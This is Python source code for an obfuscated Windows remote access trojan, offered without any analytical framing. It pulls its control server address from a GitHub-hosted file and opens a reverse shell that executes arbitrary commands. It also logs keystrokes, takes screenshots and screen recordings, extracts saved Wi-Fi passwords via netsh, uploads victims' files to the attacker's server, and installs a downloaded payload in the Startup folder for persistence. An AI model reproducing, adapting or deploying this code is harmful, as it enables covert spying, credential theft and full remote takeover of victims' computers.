import subprocess,socket,time,requests,os,logging,imageio
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
MkHZGlzH = ""
umMxzoNdlFtAJ = ""
wQbZHBvuobpDHwAYTWCC = "12.12.24.4"
jwLqQbEMJnbcbnDVBqP = "!"
EVjcVEjgWtVmSsOmroBCoG = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
HJfpONNVAkxaYTBRLppysk = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
PzNVygdWFMWnJA = os.path.expanduser("~\\AppData\\Local\\")
def rknNGmJdnCgtXqxjOUt(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def KMiBaufV(s):
	zyYcOXycL = s.recv(1024)
	if len(zyYcOXycL)==0:
		return True
	PIVNUHeyBSdlSazVY = zyYcOXycL.decode("utf-8").replace("\n","")
	if not PIVNUHeyBSdlSazVY.startswith(jwLqQbEMJnbcbnDVBqP):
		proc = subprocess.run(PIVNUHeyBSdlSazVY, shell=True, capture_output=True)
		XOdUJnEekFcSIBGXfMU = proc.stdout + proc.stderr
		s.send(XOdUJnEekFcSIBGXfMU)
		return
	NHPZEfxz = PIVNUHeyBSdlSazVY.split(" ")[0][1:]
	args = " ".join(PIVNUHeyBSdlSazVY.split()[1:]).split()
	if NHPZEfxz == "download":
		zsSugWXBJCaPmn(s, PIVNUHeyBSdlSazVY)
	elif NHPZEfxz == "screenshot":
		xppIHjoPERIf(s)
	elif NHPZEfxz == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif NHPZEfxz == "update":
		AcoJjjEBrDFtUhw(s)
	elif NHPZEfxz == "wifi":
		iaDmWKrnhNEkISzr(s)
	elif NHPZEfxz == "screenrecord":
		nBdcXPU(s, args)
def zsSugWXBJCaPmn(s, PIVNUHeyBSdlSazVY):
	LXOJlAiiRnmLAEWusSDkR = PIVNUHeyBSdlSazVY.replace(jwLqQbEMJnbcbnDVBqP+"download ","").split(",")
	XOdUJnEekFcSIBGXfMUs = ""
	for f in LXOJlAiiRnmLAEWusSDkR:
		XOdUJnEekFcSIBGXfMUs += EQlnhprNqGCIkIDtb(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(XOdUJnEekFcSIBGXfMUs, "utf-8"))
def xppIHjoPERIf(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	gKVrneYG = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(gKVrneYG)
	image.close()
	r = EQlnhprNqGCIkIDtb(gKVrneYG, "api/sscap")
	os.remove(gKVrneYG)
	s.send(bytes(r,"utf-8"))
def nBdcXPU(s, args):
	GMKXcdPwyuC = 15
	if not args == []:
		try: GMKXcdPwyuC = int(args[0])
		except: pass
	mGjiYZBOmzqMIxVDb = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	epLNEXTTxskXCOvpBbsued = []
	fps = 11
	numFrames = GMKXcdPwyuC * fps
	for _ in range(numFrames):
		epLNEXTTxskXCOvpBbsued.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(mGjiYZBOmzqMIxVDb, epLNEXTTxskXCOvpBbsued, fps=fps, quality=8)
	EQlnhprNqGCIkIDtb(mGjiYZBOmzqMIxVDb, "api/file")
def EQlnhprNqGCIkIDtb(qgCKnpeU, dbYQIOWjtpKPDtkiVLgqxo, BImvXyLBPqz=None):
	if not os.path.isfile(qgCKnpeU):
		return "[!] 404: "+qgCKnpeU+"\n"
	headers = {"user":os.getlogin()}
	if BImvXyLBPqz is not None:
		headers = {**headers, **BImvXyLBPqz}
	requests.post("http://"+MkHZGlzH+":5555/"+dbYQIOWjtpKPDtkiVLgqxo,
		files={"file":open(qgCKnpeU, "rb")},
		headers=headers)
	return "[+] 200:\n"
def AcoJjjEBrDFtUhw(s):
	h, p, v = YqLAxklE(True)
	if (v != wQbZHBvuobpDHwAYTWCC):
		uRxlfnfFxS(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def iaDmWKrnhNEkISzr(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	sWCFzrrPGVlPAfnM = ""
	for p in profiles:
		try: sWCFzrrPGVlPAfnM+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: sWCFzrrPGVlPAfnM+=f"    {p} - N/A\n"
	s.send(sWCFzrrPGVlPAfnM)
def uRxlfnfFxS(tJdJhLDE):
	acZmOLCmmkuspYub = os.path.basename(__file__)
	fileType = acZmOLCmmkuspYub.split(".")[-1]
	TTVQLxIWgPTBADsZrScLE = acZmOLCmmkuspYub.split(".")[0]+"."+tJdJhLDE+".pyw" if fileType.startswith("py") else ".exe"
	DqNqRMspzhVpkQwiR = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), TTVQLxIWgPTBADsZrScLE)
	if not os.path.isfile(DqNqRMspzhVpkQwiR):
		with open(DqNqRMspzhVpkQwiR, "w+") as f:
			f.write(requests.get(HJfpONNVAkxaYTBRLppysk+"file."+ "pyw" if DqNqRMspzhVpkQwiR.split(".")[-1].startswith("py") else "exe").text)
def YqLAxklE(force=False):
	global MkHZGlzH, umMxzoNdlFtAJ
	if force or MkHZGlzH == "" or umMxzoNdlFtAJ == "":
		zyYcOXycL = requests.get(EVjcVEjgWtVmSsOmroBCoG).text.replace("\n","").split(":")
		MkHZGlzH = zyYcOXycL[0].strip()
		umMxzoNdlFtAJ = zyYcOXycL[1].strip()
		tJdJhLDE = zyYcOXycL[2].strip()
	return MkHZGlzH, umMxzoNdlFtAJ, tJdJhLDE
def hpEDRUlFGyOxk():
	try:
		lpCwmqVNAUoZuMggF = "settings.xpb"
		mebqIOJVosbfOAmwjuFRC = sorted([file for file in os.listdir(PzNVygdWFMWnJA) if os.path.isfile(PzNVygdWFMWnJA+"\\"+file) and file.endswith(lpCwmqVNAUoZuMggF.split(".")[-1])])
		if lpCwmqVNAUoZuMggF in mebqIOJVosbfOAmwjuFRC:
			mebqIOJVosbfOAmwjuFRC.remove(lpCwmqVNAUoZuMggF)
		ugLYdopwnFGteNJBfDla = os.path.join(PzNVygdWFMWnJA,lpCwmqVNAUoZuMggF)
		if len(mebqIOJVosbfOAmwjuFRC) > 0:
			with open(ugLYdopwnFGteNJBfDla, "ab+") as f:
				for file in mebqIOJVosbfOAmwjuFRC:
					temp = os.path.join(PzNVygdWFMWnJA,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		EQlnhprNqGCIkIDtb(ugLYdopwnFGteNJBfDla, "api/log")
		if os.path.isfile(ugLYdopwnFGteNJBfDla):
			os.remove(ugLYdopwnFGteNJBfDla)
	except:
		pass
def DFteAfFvccjGHgkDEcmX():
	logging.basicConfig(filename=(PzNVygdWFMWnJA+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def GXaYXJbvmgBamLGZqisEWh(k):
		logging.info(str(k))
	k=Listener(on_press=GXaYXJbvmgBamLGZqisEWh)
	yQbzBgdzqNxZxKyVgWGvYwe = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in yQbzBgdzqNxZxKyVgWGvYwe:
		l.setLevel(logging.CRITICAL)
	k.start()
def ahgyGkvRUzpMrNOzdGbO():
	h, p, v = YqLAxklE()
	hpEDRUlFGyOxk()
	if wQbZHBvuobpDHwAYTWCC != v:
		uRxlfnfFxS(v)
	DFteAfFvccjGHgkDEcmX()
	PchbBXrZVnpR = bytes(("(old)"if wQbZHBvuobpDHwAYTWCC!=v else "")+"["+wQbZHBvuobpDHwAYTWCC+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				oIcyJHPWzfPjyApAtdCqn=False
				try:
					s=rknNGmJdnCgtXqxjOUt(h, p)
					while not oIcyJHPWzfPjyApAtdCqn:
						s.send(PchbBXrZVnpR)
						oIcyJHPWzfPjyApAtdCqn=KMiBaufV(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
ahgyGkvRUzpMrNOzdGbO()
